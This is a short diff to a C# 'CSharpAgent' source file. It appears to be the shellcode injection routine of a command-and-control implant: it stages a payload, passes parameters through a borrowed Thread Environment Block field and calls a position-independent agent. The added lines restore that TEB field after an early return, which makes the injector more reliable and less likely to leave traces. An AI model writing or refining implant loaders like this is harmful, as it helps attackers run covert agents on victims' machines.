@@ -110,6 +110,10 @@ namespace CSharpAgent
             Marshal.StructureToPtr(parameters, parametersMemory, false);
 
             int offset = (IntPtr.Size == 8) ? 0x50 : 0x28;
+            // The slot we borrow is a LIVE TEB field (ActiveRpcHandle on both x64 and x86):
+            // save the thread's value so an early-returning payload leaves the TEB exactly as
+            // it found it instead of leaving a pointer into freed heap behind.
+            IntPtr previousTebSlot = Marshal.ReadIntPtr(tebAddress, offset);
             Marshal.WriteIntPtr(tebAddress, offset, parametersMemory);
 #if DEBUG
             Diag.Show("[inj 7] staged", "payload copied, parameters written to TEB+" +
@@ -127,6 +131,11 @@ namespace CSharpAgent
             Diag.Show("[inj 9] entry RETURNED", "unexpected — the PIC agent returned immediately " +
                 "(early bail on this box?); the reply reports status 0 anyway");
 #endif
+            // Early-return path only (a real PIC entry never returns and never reaches here):
+            // restore the borrowed TEB slot FIRST, then free the block — the opposite order
+            // leaves ActiveRpcHandle pointing at freed memory for the rest of the thread's
+            // life (a use-after-free if this thread ever touches RPC again).
+            Marshal.WriteIntPtr(tebAddress, offset, previousTebSlot);
             Marshal.FreeHGlobal(parametersMemory);
         }
 
